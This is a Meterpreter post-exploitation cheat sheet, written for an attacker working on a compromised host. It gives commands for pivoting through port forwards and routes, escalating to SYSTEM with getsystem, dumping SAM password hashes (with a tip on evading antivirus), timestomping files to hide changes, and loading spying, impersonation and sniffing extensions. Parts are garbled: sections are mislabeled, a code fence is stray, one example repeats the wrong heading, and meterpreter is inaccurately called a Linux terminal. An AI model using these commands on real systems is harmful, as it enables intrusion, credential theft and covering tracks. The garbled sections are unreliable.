## Core Commands:

At its most basic use, meterpreter is a Linux terminal on the victim's computer. As such, many of our basic Linux commands can be used on the meterpreter even if it's on a Windows or other operating system. Here are some of the core commands we can use on the meterpreter:
```
?               help menu
background      moves the current session to the background
bgkill          kills a background meterpreter script
bglist          provides a list of all running background scripts
bgrun           runs a script as a background thread
channel         displays active channels
close           closes a channel
exit            terminates a meterpreter session
exploit         executes the meterpreter script designated after it
help            help menu
interact        interacts with a channel
irb             go into Ruby scripting mode
migrate         moves the active process to a designated PID
quit            terminates the meterpreter session
read            reads the data from a channel
run             executes the meterpreter script designated after it
use             loads a meterpreter extension

```

## File System Commands:

portfwd         forwards a port on the victim system to a remote service
route           view or modify the victim routing table
```
## Examples:
### Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
```
portfwd add –l 3389 –p 3389 –r target-host
```

### Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
```
portfwd delete –l 3389 –p 3389 –r target-host
```

### Meterpreter delete all port forwards
```
portfwd flush
```
### Meterpreter list active port forwards
```
portfwd list
```
### Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
```
run autoroute -s 192.168.15.0/24
```
### Meterpreter list all active routes
```
run autoroute -p
```
### Meterpreter view available networks the compromised host can access
```
route
```
### Meterpreter add route for 192.168.14.0/24 via Session 3.
```
route add 192.168.14.0 255.255.255.0 3
```
### Meterpreter delete route for 192.168.14.0/24 via Session 3.
```
route delete 192.168.14.0 255.255.255.0 3
```
### Meterpreter delete all routes
```
route flush
```

## Privilege Escalation Commands:
```
getsystem       uses 15 built-in methods to gain sysadmin privileges
```

## Password Dump Commands:
hashdump grabs the hashes in the password (SAM) file
Note that hashdump will often trip AV software, but there are now two scripts that are more stealthy, run hashdump and run smart_hashdump. Look for more on those in my meterpreter script cheat sheet.

## Timestomp Commands:
timestomp       manipulates the modify, access, and create attributes of a file



### loadable libraries:
```
meterpreter> use <library>

Permits loading extra meterpreter functionalities with the following

espia		Allows Desktop spying through screenshots
incognito	Allows user impersonation sort of commands
priv		Allows filesystem and hash dumping commands
sniffer		Allows network sniffing interaction commands
```
